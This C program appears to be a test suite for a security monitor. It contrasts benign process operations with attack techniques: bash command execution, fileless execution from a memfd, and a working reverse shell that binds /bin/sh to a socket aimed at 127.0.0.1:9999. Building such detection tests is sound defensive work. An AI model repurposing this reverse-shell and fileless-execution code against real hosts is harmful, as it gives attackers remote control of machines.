#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h> // <--- 新增: 包含了 open() 和 O_* 宏

#define REVERSE_SHELL_IP "127.0.0.1"
#define REVERSE_SHELL_PORT 9999

void print_stage(const char* message) {
    printf("\n--- [STAGE] %s ---\n", message);
}

int main() {
    printf("======== Starting Advanced Execution & Backdoor Suite ========\n");
    
    // --- 疑似有害但实则无害的操作 ---
    print_stage("Suspicious but Benign Operations");
    printf("--> [S.1] Executing a safe, non-shell command (/usr/bin/whoami)...\n");
    if (fork() == 0) {
        // 修正: 为 execve 创建合法的参数列表
        char *const whoami_argv[] = {"/usr/bin/whoami", NULL};
        execve("/usr/bin/whoami", whoami_argv, NULL);
        exit(0);
    }
    sleep(1);

    printf("--> [S.2] Redirecting stdout to a log file using dup2...\n");
    // 修正: 使用 open() 而不是 popen()
    int log_fd = open("/tmp/suite2_exec.log", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (log_fd != -1) {
        int stdout_bak = dup(1);
        dup2(log_fd, 1);
        printf("This line goes to the log file.\n");
        fflush(stdout);
        dup2(stdout_bak, 1);
        close(log_fd);
        close(stdout_bak);
        printf("      (Log redirection finished)\n");
    }

    // --- 真正有害的操作 ---
    print_stage("Truly Malicious Operations");
    printf("--> [M.1] Attack: Direct command injection with /bin/bash...\n");
    if (fork() == 0) {
        char *const bash_argv[] = {"/bin/bash", "-c", "echo '[+] Malicious shell execution successful.'", NULL};
        // 修正: 为 execve 提供第三个参数 (NULL)
        execve("/bin/bash", bash_argv, NULL);
        exit(0);
    }
    sleep(1);

    printf("--> [M.2] Attack: Fileless execution from memory...\n");
    const char* script = "#!/bin/sh\necho '[+] Malicious fileless execution successful!'\n";
    int mem_fd = memfd_create("payload", 0);
    if (mem_fd != -1) {
        write(mem_fd, script, strlen(script));
        char path[256];
        sprintf(path, "/proc/self/fd/%d", mem_fd);
        if (fork() == 0) {
            // 修正: 为 execve 创建合法的参数列表
            char *const mem_argv[] = {path, NULL};
            execve(path, mem_argv, NULL);
            exit(0);
        }
        sleep(1);
    }

    print_stage("Reverse Shell Backdoor");
    printf("INFO: To test this, please run 'nc -l -p %d' in another terminal.\n", REVERSE_SHELL_PORT);
    // if (fork() == 0) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(9999); 
        addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        dup2(sock, 0); // stdin
        dup2(sock, 1); // stdout
        dup2(sock, 2); // stderr
        execve("/bin/sh", NULL, NULL);
        exit(0);
    // }
    
    sleep(1);
    printf("\n======== Suite Finished ========\n");
    return 0;
}
